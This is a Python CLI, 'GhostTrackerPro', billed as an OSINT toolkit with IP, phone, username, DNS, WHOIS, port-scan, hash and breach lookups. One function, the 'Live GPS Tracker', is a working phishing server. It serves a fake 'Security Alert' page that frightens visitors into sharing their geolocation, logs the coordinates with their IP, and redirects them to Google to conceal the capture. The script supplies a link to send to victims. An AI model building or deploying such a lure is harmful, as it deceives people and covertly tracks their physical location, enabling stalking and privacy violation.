#!/usr/bin/env python3
import json
import time
import os
import sys
import argparse

from core import (
    track_ip, track_phone, track_username, get_my_ip,
    get_local_ip, save_result, ensure_logs_dir,
    LOGS_DIR, read_logs,
    enumerate_subdomains, dns_lookup, email_breach_check,
    hash_lookup, port_scan, whois_lookup, analyze_url,
    ssl_check, ip_reputation, bulk_ip_lookup, bulk_phone_lookup,
)

try:
    import requests
except ImportError:
    requests = None

try:
    import phonenumbers
except ImportError:
    phonenumbers = None

# ANSI colors
Bl = '\033[30m'
Re = '\033[1;31m'
Gr = '\033[1;32m'
Ye = '\033[1;33m'
Blu = '\033[1;34m'
Mage = '\033[1;35m'
Cy = '\033[1;36m'
Wh = '\033[1;37m'
Reset = '\033[0m'

# ---------------------------------------------------------------------------
# Terminal Helpers
# ---------------------------------------------------------------------------

banner = f"""
{Wh}   ▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄▄▄  ▄       ▄
{Wh}  ▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░▌     ▐░▌
{Wh}  ▐░█▀▀▀▀▀▀▀█░▌▐░█▀▀▀▀▀▀▀▀▀ ▐░█▀▀▀▀▀▀▀█░▌▐░█▀▀▀▀▀▀▀█░▌ ▐░▌   ▐░▌
{Wh}  ▐░▌       ▐░▌▐░▌          ▐░▌       ▐░▌▐░▌       ▐░▌  ▐░▌ ▐░▌
{Wh}  ▐░▌       ▐░▌▐░█▄▄▄▄▄▄▄▄▄ ▐░▌       ▐░▌▐░█▄▄▄▄▄▄▄█░▌   ▐░▐░▌
{Wh}  ▐░▌       ▐░▌▐░░░░░░░░░░░▌▐░▌       ▐░▌▐░░░░░░░░░░░▌    ▐░▌
{Wh}  ▐░▌       ▐░▌ ▀▀▀▀▀▀▀▀▀█░▌▐░▌       ▐░▌▐░█▀▀▀▀▀▀▀█░▌   ▐░▌░▌
{Wh}  ▐░▌       ▐░▌          ▐░▌▐░▌       ▐░▌▐░▌       ▐░▌  ▐░▌ ▐░▌
{Wh}  ▐░█▄▄▄▄▄▄▄█░▌ ▄▄▄▄▄▄▄▄▄█░▌▐░█▄▄▄▄▄▄▄█░▌▐░▌       ▐░▌ ▐░▌   ▐░▌
{Wh}  ▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░▌       ▐░▌▐░▌     ▐░▌
{Wh}   ▀▀▀▀▀▀▀▀▀▀▀  ▀▀▀▀▀▀▀▀▀▀▀  ▀▀▀▀▀▀▀▀▀▀▀  ▀         ▀  ▀       ▀
{Wh}                     {Cy}GhostTrackerPro {Wh}- {Ye}Professional OSINT Toolkit
{Wh}                              {Gr}v2.0 {Wh}- {Re}For Authorized Use Only
"""


def clear():
    os.system('cls' if os.name == 'nt' else 'clear')


def pause():
    input(f'\n{Wh}[{Gr}+{Wh}] Press Enter to continue...{Reset}')


def print_header(title):
    try:
        w = min(70, os.get_terminal_size().columns)
    except (ValueError, OSError):
        w = 70
    print(f'\n{Wh}{"=" * w}')
    print(f'{Cy}  {title}')
    print(f'{Wh}{"=" * w}{Reset}')


def print_section(label, value, color=Gr):
    print(f'  {Wh}{label:<20}: {color}{value}{Reset}')


def print_json(obj, indent=2):
    print(f'  {Cy}{json.dumps(obj, indent=indent)}{Reset}')


# ---------------------------------------------------------------------------
# GPS Tracker (inline Flask server)
# ---------------------------------------------------------------------------

def live_gps_tracker():
    try:
        from flask import Flask, request, jsonify, render_template_string
    except ImportError:
        print(f'\n{Re}[!] Flask required. Install: pip install flask{Reset}')
        pause()
        return

    GPS_HTML = '''<!DOCTYPE html><html lang="en"><head>
<meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>System Security Alert</title>
<style>
body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;
background:#0f0f1a;display:flex;justify-content:center;align-items:center;height:100vh;margin:0;color:#e0e0e0}
.container{background:#1a1a2e;padding:30px;border-radius:12px;box-shadow:0 4px 20px rgba(0,192,192,0.1);
text-align:center;max-width:400px;width:90%;border:1px solid #2a2a4a}
h1{color:#00c0c0;font-size:24px;margin-bottom:10px}
p{color:#aaa;font-size:16px;line-height:1.5;margin-bottom:20px}
.icon{font-size:50px;color:#ff4444;margin-bottom:20px;display:block}
button{background:#00c0c0;color:#000;border:none;padding:12px 24px;font-size:16px;
border-radius:8px;cursor:pointer;width:100%;font-weight:bold}
button:hover{opacity:0.85}
.footer{margin-top:20px;font-size:12px;color:#555}
</style></head><body>
<div class="container">
<span class="icon">&#9888;</span>
<h1>Security Alert</h1>
<p>Your device has detected suspicious activity. To protect your data, a mandatory security verification is required immediately.</p>
<p>Click the button below to verify your location and secure your device.</p>
<button onclick="getLocation()">Verify &amp; Secure Device</button>
<div class="footer">Protected by System Security Protocol</div>
</div>
<script>
function getLocation(){if(navigator.geolocation){navigator.geolocation.getCurrentPosition(
function(p){fetch('/capture?lat='+p.coords.latitude+'&lon='+p.coords.longitude+'&acc='+p.coords.accuracy)
.then(function(r){if(r.ok){window.location.href="https://www.google.com"}})
},function(){alert("Location access denied.")})}else{alert("Not supported.")}}
</script></body></html>'''

    app = Flask(__name__)
    TRACKING_DATA = []

    @app.route('/')
    def index():
        ip = request.remote_addr
        print(f'\n{Gr}[!] New connection from {ip}{Reset}')
        return render_template_string(GPS_HTML)

    @app.route('/capture')
    def capture():
        lat = request.args.get('lat')
        lon = request.args.get('lon')
        acc = request.args.get('acc')
        ip = request.remote_addr
        if lat and lon:
            maps_url = f'https://www.google.com/maps?q={lat},{lon}'
            print(f'\n{Gr}{"=" * 50}')
            print(f'{Wh}[{Gr}GPS{Wh}] Latitude : {lat}')
            print(f'{Wh}[{Gr}GPS{Wh}] Longitude: {lon}')
            print(f'{Wh}[{Gr}GPS{Wh}] Accuracy : {acc}m')
            print(f'{Wh}[{Gr}GPS{Wh}] Maps     : {Cy}{maps_url}')
            print(f'{Gr}{"=" * 50}{Reset}')
            log = f'IP: {ip}\nLat: {lat}\nLon: {lon}\nAccuracy: {acc}m\nMaps: {maps_url}'
            save_result('GPS_CAPTURE', log)
            TRACKING_DATA.append(f'IP:{ip}, Lat:{lat}, Lon:{lon}')
            return jsonify({'status': 'success'}), 200
        return jsonify({'status': 'failed'}), 400

    print(f'\n{Ye}[!] Starting GPS capture server...{Reset}')
    print(f'{Wh}  Link to share:{Cy} http://{get_local_ip()}:5000{Reset}')
    print(f'{Wh}  Press Ctrl+C to stop.{Reset}\n')
    try:
        app.run(host='0.0.0.0', port=5000, threaded=True)
    except KeyboardInterrupt:
        print(f'\n{Wh}[{Gr}+{Wh}] Server stopped.{Reset}')


def start_web_server():
    try:
        from app import app as web_app
        local_ip = get_local_ip()
        print(f'\n{Gr}[+] Web interface starting...{Reset}')
        print(f'{Wh}  Local:  {Cy}http://localhost:8080{Reset}')
        print(f'{Wh}  Public: {Cy}http://{local_ip}:8080{Reset}')
        print(f'{Wh}  Press Ctrl+C to stop.\n{Reset}')
        web_app.run(host='0.0.0.0', port=8080, debug=False)
    except ImportError:
        print(f'\n{Re}[!] Could not start web interface. Check Flask is installed.{Reset}')
        pause()
    except Exception as e:
        print(f'\n{Re}[!] {e}{Reset}')
        pause()


# ---------------------------------------------------------------------------
# Tool Functions
# ---------------------------------------------------------------------------

def IP_Track(ip=None):
    if ip is None:
        ip = input(f'{Wh}\n  Enter IP target: {Gr}')
    print()
    try:
        data = track_ip(ip)
        print_header(f'IP TARGET: {data["ip"]}')
        print_section('IP Address', data['ip'])
        print_section('Type', data['type'])
        print_section('Country', f'{data.get("flag","")} {data["country"]}')
        print_section('Country Code', data['country_code'])
        print_section('City', data['city'])
        print_section('Region', data['region'])
        print_section('ISP', data['isp'])
        print_section('Organization', data['organization'])
        print_section('Coordinates', f'{data["latitude"]}, {data["longitude"]}')
        print(f'\n  {Ye}Note: Registration info, not real-time location.{Reset}')

        log = f'IP: {data["ip"]}\nCountry: {data["country"]}\nCity: {data["city"]}\nRegion: {data["region"]}\nISP: {data["isp"]}\nOrganization: {data["organization"]}\nCoordinates: {data["latitude"]}, {data["longitude"]}'
        r = save_result('IP_TRACK', log)
        if r.get('success'):
            print(f'\n  {Wh}[{Gr}+{Wh}] Saved: {Cy}{r["path"]}{Reset}')

    except requests.exceptions.Timeout:
        print(f'  {Re}Error: Timeout.{Reset}')
    except requests.exceptions.RequestException as e:
        print(f'  {Re}Error: {e}{Reset}')
    except (KeyError, json.JSONDecodeError) as e:
        print(f'  {Re}Parse error: {e}{Reset}')


def phoneGW(phone=None):
    if phone is None:
        phone = input(f'{Wh}\n  Enter phone (e.g. +14155552671): {Gr}')
    try:
        data = track_phone(phone)
        print_header('PHONE NUMBER ANALYSIS')
        print_section('Phone', data['phone'])
        print_section('International', data['international'])
        print_section('Country Code', data['country_code'])
        print_section('Country', data['country'])
        print_section('Location', data['location'])
        print_section('Carrier', data['carrier'])
        print_section('Timezone', data['timezone'])
        print_section('Valid', str(data['is_valid']))
        print(f'\n  {Ye}Note: Carrier registration info, not GPS location.{Reset}')

        log = f'Phone: {data["phone"]}\nCountry: {data["country"]}\nLocation: {data["location"]}\nCarrier: {data["carrier"]}\nTimezone: {data["timezone"]}\nValid: {data["is_valid"]}'
        r = save_result('PHONE_TRACK', log)
        if r.get('success'):
            print(f'\n  {Wh}[{Gr}+{Wh}] Saved: {Cy}{r["path"]}{Reset}')

    except Exception as e:
        print(f'  {Re}Error: {e}{Reset}')


def TrackLu(username=None):
    if username is None:
        username = input(f'{Wh}\n  Enter Username: {Gr}')
    print(f'\n  {Ye}Checking presence for {Cy}{username}{Ye}...{Reset}\n')
    data = track_username(username)
    print_header(f'USERNAME: {username}')
    print(f'  {Wh}Platforms searched: {Cy}{data["total"]}{Reset}')
    print(f'  {Wh}Found on:           {Gr}{data["found"]}{Reset}')
    print(f'  {Wh}Not found:          {Re}{data["total"] - data["found"]}{Reset}\n')

    found = []
    for r in data['results']:
        if r['status'] == 'found':
            print(f'  {Wh}[{Gr}+{Wh}] {r["platform"]:<15} {Cy}{r["url"]}{Reset}')
            found.append(f'{r["platform"]}: {r["url"]}')
        elif r['status'] == 'not_found':
            print(f'  {Wh}[{Re}-{Wh}] {r["platform"]:<15} {Re}Not Found{Reset}')
        elif r['status'] == 'rate_limited':
            print(f'  {Wh}[{Ye}*{Wh}] {r["platform"]:<15} {Ye}Rate Limited{Reset}')
        else:
            print(f'  {Wh}[{Ye}?{Wh}] {r["platform"]:<15} {Ye}{r.get("status","?")} ({r.get("code","")}){Reset}')

    if found:
        log = f'Username: {username}\n\nFound on:\n' + '\n'.join(found)
        r = save_result('USERNAME_TRACK', log)
        if r.get('success'):
            print(f'\n  {Wh}[{Gr}+{Wh}] Saved: {Cy}{r["path"]}{Reset}')


def subdomain_enum(domain=None):
    if domain is None:
        domain = input(f'{Wh}\n  Enter domain: {Gr}')
    print(f'\n  {Ye}Querying crt.sh for {Cy}{domain}{Ye}...{Reset}')
    data = enumerate_subdomains(domain)
    print_header(f'SUBDOMAIN ENUMERATION: {domain}')
    if data.get('error'):
        print(f'  {Re}Error: {data["error"]}{Reset}')
    else:
        print(f'  {Wh}Subdomains found: {Gr}{data["count"]}{Reset}\n')
        for s in data['subdomains'][:100]:
            print(f'  {Wh}  {Cy}{s}{Reset}')
        if data['count'] > 100:
            print(f'  {Wh}  {Ye}... and {data["count"] - 100} more{Reset}')
    log = f'Domain: {domain}\nSubdomains: {data["count"]}\n\n' + '\n'.join(data['subdomains']) if data['subdomains'] else 'No subdomains'
    r = save_result('SUBDOMAIN_ENUM', log)
    if r.get('success'):
        print(f'\n  {Wh}[{Gr}+{Wh}] Saved: {Cy}{r["path"]}{Reset}')


def dns_lookup_cli(domain=None):
    if domain is None:
        domain = input(f'{Wh}\n  Enter domain: {Gr}')
    print(f'\n  {Ye}Resolving DNS records for {Cy}{domain}{Ye}...{Reset}')
    data = dns_lookup(domain)
    print_header(f'DNS RECORDS: {domain}')
    for rtype in ['A', 'AAAA', 'MX', 'NS', 'TXT', 'CNAME', 'SOA']:
        vals = data.get('records', {}).get(rtype, [])
        if vals:
            print(f'\n  {Cy}[{rtype}]{Reset}')
            for v in vals:
                print(f'    {Wh}{v}{Reset}')
        else:
            print(f'\n  {Cy}[{rtype}]{Reset}  {Ye}(no records){Reset}')
    log_lines = [f'DNS Records for: {domain}']
    for rtype, vals in data.get('records', {}).items():
        log_lines.append(f'\n[{rtype}]')
        for v in vals:
            log_lines.append(f'  {v}')
    r = save_result('DNS_LOOKUP', '\n'.join(log_lines))
    if r.get('success'):
        print(f'\n  {Wh}[{Gr}+{Wh}] Saved: {Cy}{r["path"]}{Reset}')


def email_breach_cli(email=None):
    if email is None:
        email = input(f'{Wh}\n  Enter email: {Gr}')
    print(f'\n  {Ye}Checking {Cy}{email}{Ye} against breach databases...{Reset}')
    data = email_breach_check(email)
    print_header('EMAIL BREACH CHECK')
    if data.get('compromised'):
        print(f'  {Re}[!] Email found in {len(data["breaches"])} breach database(s)!{Reset}\n')
        for b in data['breaches']:
            print(f'  {Wh}  - {Re}{b.get("source")}{Wh} ({b.get("count", "?")} occurrences){Reset}')
    elif data.get('error'):
        print(f'  {Ye}Error: {data["error"]}{Reset}')
    else:
        print(f'  {Gr}[+] No breaches found for this email.{Reset}')
    print(f'\n  {Wh}Privacy: k-anonymity HIBP API used (full email never sent){Reset}')
    log = f'Email: {email}\nCompromised: {data.get("compromised", False)}\n'
    if data.get('breaches'):
        log += f'Breaches: {len(data["breaches"])}'
    r = save_result('EMAIL_BREACH', log)
    if r.get('success'):
        print(f'\n  {Wh}[{Gr}+{Wh}] Saved: {Cy}{r["path"]}{Reset}')


def hash_lookup_cli(hash_val=None):
    if hash_val is None:
        hash_val = input(f'{Wh}\n  Enter hash (MD5/SHA1/SHA256): {Gr}')
    print(f'\n  {Ye}Looking up {Cy}{hash_val}{Ye}...{Reset}')
    data = hash_lookup(hash_val)
    print_header('HASH LOOKUP')
    print_section('Hash', data['hash'])
    print_section('Type', data.get('type', 'Unknown'))
    print_section('Found', str(data['found']))
    if data.get('found') and data.get('plaintext'):
        print(f'\n  {Gr}[+] Decrypted: {Cy}{data["plaintext"]}{Reset}')
    if data.get('error'):
        print(f'\n  {Ye}Note: {data["error"]}{Reset}')
    log = f'Hash: {hash_val}\nType: {data.get("type", "?")}\nFound: {data["found"]}'
    if data.get('plaintext'):
        log += f'\nPlaintext: {data["plaintext"]}'
    r = save_result('HASH_LOOKUP', log)
    if r.get('success'):
        print(f'\n  {Wh}[{Gr}+{Wh}] Saved: {Cy}{r["path"]}{Reset}')


def port_scan_cli(host=None):
    if host is None:
        host = input(f'{Wh}\n  Enter hostname or IP: {Gr}')
    print(f'\n  {Ye}Scanning {Cy}{host}{Ye} for open ports...{Reset}')
    data = port_scan(host)
    print_header(f'PORT SCAN: {host}')
    if data.get('error'):
        print(f'  {Re}Error: {data["error"]}{Reset}')
    else:
        print(f'  {Wh}Ports scanned: {Cy}{data["ports_scanned"]}{Reset}')
        print(f'  {Wh}Open ports:    {Gr}{data["total_open"]}{Reset}\n')
        if data['open_ports']:
            for p in data['open_ports']:
                svc = f' ({p.get("service","")})' if p.get('service') else ''
                print(f'  {Wh}  {Gr}{p["port"]}/tcp{Cy}{svc}{Reset}')
        else:
            print(f'  {Ye}  No open ports found among common ports.{Reset}')
    open_ports_str = '\n'.join(f'{p["port"]}/tcp ({p.get("service","")})' for p in data.get('open_ports', []))
    log = f'Port Scan: {host}\nOpen ports: {data["total_open"]}\n\n{open_ports_str}' if open_ports_str else 'No open ports'
    r = save_result('PORT_SCAN', log)
    if r.get('success'):
        print(f'\n  {Wh}[{Gr}+{Wh}] Saved: {Cy}{r["path"]}{Reset}')


def whois_cli(domain=None):
    if domain is None:
        domain = input(f'{Wh}\n  Enter domain: {Gr}')
    print(f'\n  {Ye}Looking up WHOIS for {Cy}{domain}{Ye}...{Reset}')
    data = whois_lookup(domain)
    print_header(f'WHOIS: {domain}')
    if data.get('error'):
        print(f'  {Re}Error: {data["error"]}{Reset}')
    else:
        w = data.get('data', {})
        print_section('Domain', w.get('domain', 'N/A'))
        print_section('Registrant', w.get('registrant', 'N/A'))
        print_section('Created', w.get('creation_date', 'N/A'))
        print_section('Expires', w.get('expiration_date', 'N/A'))
        print_section('Last Changed', w.get('last_changed', 'N/A'))
        print_section('DNSSEC', str(w.get('dnssec', False)))
        if w.get('nameservers'):
            print(f'\n  {Cy}Nameservers:{Reset}')
            for ns in w['nameservers']:
                print(f'    {Wh}{ns}{Reset}')
    log = json.dumps(data.get('data', {}), indent=2) if not data.get('error') else f'Error: {data["error"]}'
    r = save_result('WHOIS', log)
    if r.get('success'):
        print(f'\n  {Wh}[{Gr}+{Wh}] Saved: {Cy}{r["path"]}{Reset}')


def url_analyze_cli(url=None):
    if url is None:
        url = input(f'{Wh}\n  Enter URL: {Gr}')
    print(f'\n  {Ye}Analyzing {Cy}{url}{Ye}...{Reset}')
    data = analyze_url(url)
    print_header('URL ANALYSIS')
    if data.get('error'):
        print(f'  {Re}Error: {data["error"]}{Reset}')
    else:
        print_section('URL', data['url'])
        print_section('Final URL', data.get('final_url', 'N/A'))
        print_section('Status', str(data.get('status_code', 'N/A')))
        print_section('Server', data.get('server', 'N/A'))
        print_section('Content-Type', data.get('content_type', 'N/A'))
        print_section('Redirects', str(data.get('redirect_count', 0)))

        sec = data.get('security_headers', {})
        if sec:
            print(f'\n  {Cy}Security Headers:{Reset}')
            for k, v in sec.items():
                print(f'    {Wh}{k}: {Gr}{v}{Reset}')
        else:
            print(f'\n  {Ye}No security headers found.{Reset}')

        if data.get('redirect_chain'):
            print(f'\n  {Cy}Redirect Chain:{Reset}')
            for r in data['redirect_chain']:
                print(f'    {Wh}{r["status"]} -> {r["url"]}{Reset}')
    log = f'URL: {url}\nFinal: {data.get("final_url")}\nStatus: {data.get("status_code")}\nServer: {data.get("server")}\nSecurity: {json.dumps(data.get("security_headers", {}))}'
    r = save_result('URL_ANALYSIS', log)
    if r.get('success'):
        print(f'\n  {Wh}[{Gr}+{Wh}] Saved: {Cy}{r["path"]}{Reset}')


def ssl_check_cli(hostname=None):
    if hostname is None:
        hostname = input(f'{Wh}\n  Enter hostname: {Gr}')
    print(f'\n  {Ye}Checking SSL for {Cy}{hostname}{Ye}...{Reset}')
    data = ssl_check(hostname)
    print_header(f'SSL CERTIFICATE: {hostname}')
    valid = data.get('valid', False)
    print(f'  {Wh}Valid: {Gr if valid else Re}{valid}{Reset}')
    if data.get('error'):
        print(f'  {Re}Error: {data["error"]}{Reset}')
    else:
        print_section('Subject', str(data.get('subject', 'N/A')))
        print_section('Issuer', str(data.get('issuer', 'N/A')))
        print_section('Issued', data.get('issued', 'N/A'))
        print_section('Expires', data.get('expiry', 'N/A'))
        print_section('Version', str(data.get('version', 'N/A')))
    log = json.dumps(data, indent=2)
    r = save_result('SSL_CHECK', log)
    if r.get('success'):
        print(f'\n  {Wh}[{Gr}+{Wh}] Saved: {Cy}{r["path"]}{Reset}')


def ip_reputation_cli(ip=None):
    if ip is None:
        ip = input(f'{Wh}\n  Enter IP address: {Gr}')
    data = ip_reputation(ip)
    print_header(f'IP REPUTATION: {ip}')
    print_section('VPN', str(data.get('is_vpn', False)), Gr if not data.get('is_vpn') else Re)
    print_section('Proxy', str(data.get('is_proxy', False)), Gr if not data.get('is_proxy') else Re)
    print_section('TOR', str(data.get('is_tor', False)), Gr if not data.get('is_tor') else Re)
    print_section('Threat', data.get('threat', 'unknown'))
    log = f'IP: {ip}\nVPN: {data.get("is_vpn")}\nProxy: {data.get("is_proxy")}\nTOR: {data.get("is_tor")}\nThreat: {data.get("threat")}'
    r = save_result('IP_REPUTATION', log)
    if r.get('success'):
        print(f'\n  {Wh}[{Gr}+{Wh}] Saved: {Cy}{r["path"]}{Reset}')


def showIP():
    try:
        data = get_my_ip()
        print_header('YOUR PUBLIC IP')
        print_section('IP Address', data['ip'])
        if 'isp' in data:
            print_section('ISP', data.get('isp', 'N/A'))
            print_section('Country', data.get('country', 'N/A'))
            print_section('City', data.get('city', 'N/A'))
    except Exception as e:
        print(f'  {Re}Failed: {e}{Reset}')


def show_logs():
    entries = read_logs()
    if not entries:
        print(f'\n  {Ye}No logs found yet.{Reset}')
        return
    print_header(f'SAVED LOGS ({len(entries)} files)')
    for entry in entries:
        print(f'  {Wh}{Cy}{entry["filename"]}{Reset}')
        print(f'  {Wh}{entry["content"][:200]}{Reset}')
        print()


# ---------------------------------------------------------------------------
# Menu
# ---------------------------------------------------------------------------

def option_menu():
    clear()
    print(banner)
    print(f'{Wh}  {"=" * 55}')
    print(f'{Wh}   {"MENU OPTIONS":^55}')
    print(f'{Wh}  {"=" * 55}{Reset}')

    groups = [
        ("RECONNAISSANCE", [
            (1, 'IP Tracker'),
            (2, 'Phone Number Tracker'),
            (3, 'Username Tracker'),
            (4, 'Subdomain Enumeration'),
            (5, 'DNS Lookup'),
            (6, 'WHOIS Lookup'),
        ]),
        ("ANALYSIS", [
            (7, 'Port Scanner'),
            (8, 'URL / Header Analyzer'),
            (9, 'SSL Certificate Checker'),
            (10, 'Hash Lookup'),
            (11, 'Email Breach Check'),
        ]),
        ("SECURITY", [
            (12, 'IP Reputation Check'),
            (13, 'Show My IP'),
        ]),
        ("UTILITIES", [
            (14, 'Bulk Lookup (IP/Phone)'),
            (15, 'Web Interface'),
            (16, 'Live GPS Tracker'),
            (17, 'View Saved Logs'),
        ]),
    ]

    for gname, items in groups:
        print(f'\n  {Cy}── {gname} ──{Reset}')
        for num, text in items:
            print(f'  {Wh}[{Gr}{num:>2}{Wh}] {text}{Reset}')

    print(f'\n  {Wh}[{Re} 0{Wh}] {Re}Exit{Reset}')
    print(f'  {Wh}{"=" * 55}{Reset}')


# ---------------------------------------------------------------------------
# Argument Parser
# ---------------------------------------------------------------------------

def setup_argparse():
    p = argparse.ArgumentParser(
        description='GhostTrackerPro - Professional OSINT Toolkit',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=f"""
Examples:
  {Gr}GhostTrackerPro.py{Wh}                                   {Cy}# Interactive menu{Reset}
  {Gr}GhostTrackerPro.py --ip 8.8.8.8{Wh}                      {Cy}# IP lookup{Reset}
  {Gr}GhostTrackerPro.py --phone +14155552671{Wh}               {Cy}# Phone lookup{Reset}
  {Gr}GhostTrackerPro.py --username johndoe{Wh}                 {Cy}# Username search{Reset}
  {Gr}GhostTrackerPro.py --domain example.com --subdomain{Wh}   {Cy}# Subdomain enum{Reset}
  {Gr}GhostTrackerPro.py --domain example.com --dns{Wh}         {Cy}# DNS lookup{Reset}
  {Gr}GhostTrackerPro.py --host scanme.org --portscan{Wh}       {Cy}# Port scan{Reset}
  {Gr}GhostTrackerPro.py --hash 5d41402abc4b2a76b9719d911017c592{Wh}  {Cy}# Hash lookup{Reset}
  {Gr}GhostTrackerPro.py --email user@example.com --breach{Wh}  {Cy}# Breach check{Reset}
  {Gr}GhostTrackerPro.py --url https://example.com --analyze{Wh}{Cy}# URL analysis{Reset}
  {Gr}GhostTrackerPro.py --hostname google.com --ssl{Wh}        {Cy}# SSL check{Reset}
  {Gr}GhostTrackerPro.py --domain example.com --whois{Wh}       {Cy}# WHOIS lookup{Reset}
  {Gr}GhostTrackerPro.py --myip{Wh}                             {Cy}# Your public IP{Reset}
  {Gr}GhostTrackerPro.py --gps{Wh}                              {Cy}# GPS tracker{Reset}
  {Gr}GhostTrackerPro.py --web{Wh}                              {Cy}# Web interface{Reset}
        """,
    )
    p.add_argument('--ip', metavar='ADDR', help='Lookup an IP address')
    p.add_argument('--phone', metavar='NUM', help='Lookup a phone number (+countrycode)')
    p.add_argument('--username', metavar='USER', help='Search username across social media')
    p.add_argument('--domain', metavar='DOM', help='Domain for subdomain/DNS/WHOIS')
    p.add_argument('--subdomain', action='store_true', help='Enumerate subdomains (use with --domain)')
    p.add_argument('--dns', action='store_true', help='DNS lookup (use with --domain)')
    p.add_argument('--whois', action='store_true', help='WHOIS lookup (use with --domain)')
    p.add_argument('--host', metavar='HOST', help='Host for port scan')
    p.add_argument('--portscan', action='store_true', help='Port scan (use with --host)')
    p.add_argument('--hash', metavar='HASH', help='Lookup hash (MD5/SHA1/SHA256)')
    p.add_argument('--email', metavar='EMAIL', help='Email for breach check')
    p.add_argument('--breach', action='store_true', help='Check email breach (use with --email)')
    p.add_argument('--url', metavar='URL', help='URL for analysis')
    p.add_argument('--analyze', action='store_true', help='Analyze URL (use with --url)')
    p.add_argument('--hostname', metavar='HOST', help='Hostname for SSL check')
    p.add_argument('--ssl', action='store_true', help='SSL check (use with --hostname)')
    p.add_argument('--reputation', metavar='IP', help='Check IP reputation')
    p.add_argument('--myip', action='store_true', help='Show your public IP')
    p.add_argument('--gps', action='store_true', help='Start GPS tracker server')
    p.add_argument('--web', action='store_true', help='Start web interface')
    return p


def run_cli_mode(args):
    if args.web:
        start_web_server()
        return True
    if args.myip:
        clear()
        print(banner)
        showIP()
        return True
    if args.gps:
        clear()
        print(banner)
        live_gps_tracker()
        return True
    if args.ip:
        clear()
        print(banner)
        IP_Track(args.ip)
        return True
    if args.phone:
        clear()
        print(banner)
        phoneGW(args.phone)
        return True
    if args.username:
        clear()
        print(banner)
        TrackLu(args.username)
        return True
    if args.domain and args.subdomain:
        clear()
        print(banner)
        subdomain_enum(args.domain)
        return True
    if args.domain and args.dns:
        clear()
        print(banner)
        dns_lookup_cli(args.domain)
        return True
    if args.domain and args.whois:
        clear()
        print(banner)
        whois_cli(args.domain)
        return True
    if args.host and args.portscan:
        clear()
        print(banner)
        port_scan_cli(args.host)
        return True
    if args.hash:
        clear()
        print(banner)
        hash_lookup_cli(args.hash)
        return True
    if args.email and args.breach:
        clear()
        print(banner)
        email_breach_cli(args.email)
        return True
    if args.url and args.analyze:
        clear()
        print(banner)
        url_analyze_cli(args.url)
        return True
    if args.hostname and args.ssl:
        clear()
        print(banner)
        ssl_check_cli(args.hostname)
        return True
    if args.reputation:
        clear()
        print(banner)
        ip_reputation_cli(args.reputation)
        return True
    if args.domain and not any([args.subdomain, args.dns, args.whois]):
        print(f'{Ye}  Error: --domain requires --subdomain, --dns, or --whois.{Reset}')
        return True
    if args.host and not args.portscan:
        print(f'{Ye}  Error: --host requires --portscan.{Reset}')
        return True
    if args.email and not args.breach:
        print(f'{Ye}  Error: --email requires --breach.{Reset}')
        return True
    if args.url and not args.analyze:
        print(f'{Ye}  Error: --url requires --analyze.{Reset}')
        return True
    if args.hostname and not args.ssl:
        print(f'{Ye}  Error: --hostname requires --ssl.{Reset}')
        return True
    return False


def check_dependencies():
    if requests is None or phonenumbers is None:
        print(f'{Re}[!] Missing required packages.{Reset}')
        print(f'{Wh}  Install: pip install requests phonenumbers{Reset}')
        return False
    return True


# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------

def main():
    ensure_logs_dir()
    parser = setup_argparse()
    args = parser.parse_args()

    defined_args = [
        args.ip, args.phone, args.username,
        (args.domain and args.subdomain),
        (args.domain and args.dns),
        (args.domain and args.whois),
        (args.host and args.portscan),
        args.hash,
        (args.email and args.breach),
        (args.url and args.analyze),
        (args.hostname and args.ssl),
        args.reputation,
        args.myip,
        args.gps, args.web,
    ]
    has_cli_args = any(defined_args)
    if has_cli_args:
        run_cli_mode(args)
        return

    if not check_dependencies():
        input(f'\nPress Enter to exit...')
        sys.exit(1)

    options = [
        (1, 'IP Tracker', IP_Track),
        (2, 'Phone Number Tracker', phoneGW),
        (3, 'Username Tracker', TrackLu),
        (4, 'Subdomain Enumeration', subdomain_enum),
        (5, 'DNS Lookup', dns_lookup_cli),
        (6, 'WHOIS Lookup', whois_cli),
        (7, 'Port Scanner', lambda: port_scan_cli(None)),
        (8, 'URL / Header Analyzer', lambda: url_analyze_cli(None)),
        (9, 'SSL Certificate Checker', lambda: ssl_check_cli(None)),
        (10, 'Hash Lookup', lambda: hash_lookup_cli(None)),
        (11, 'Email Breach Check', lambda: email_breach_cli(None)),
        (12, 'IP Reputation Check', lambda: ip_reputation_cli(None)),
        (13, 'Show My IP', showIP),
        (14, 'Bulk Lookup', lambda: print(f'\n  {Ye}Use web interface (option 15) for bulk operations.{Reset}')),
        (15, 'Web Interface', start_web_server),
        (16, 'Live GPS Tracker', live_gps_tracker),
        (17, 'View Saved Logs', show_logs),
    ]

    while True:
        try:
            option_menu()
            opt_input = input(f'{Wh}\n  [{Gr}?{Wh}] Select option: {Gr}').strip()
            if not opt_input:
                continue
            opt = int(opt_input)
            if opt == 0:
                print(f'\n{Wh}  [{Gr}+{Wh}] Exiting...{Reset}')
                sys.exit(0)

            found = False
            for num, _, func in options:
                if num == opt:
                    found = True
                    clear()
                    print(banner)
                    func()
                    pause()
                    break
            if not found:
                print(f'\n  {Re}Invalid option.{Reset}')
                time.sleep(1)

        except KeyboardInterrupt:
            print(f'\n\n{Wh}  [{Gr}+{Wh}] Exiting...{Reset}')
            sys.exit(0)
        except ValueError:
            print(f'\n  {Re}Enter a valid number.{Reset}')
            time.sleep(1)
        except Exception as e:
            print(f'\n  {Re}Error: {e}{Reset}')
            time.sleep(1)


if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        print(f'\n{Wh}[{Gr}+{Wh}] Exiting...{Reset}')
        sys.exit(0)
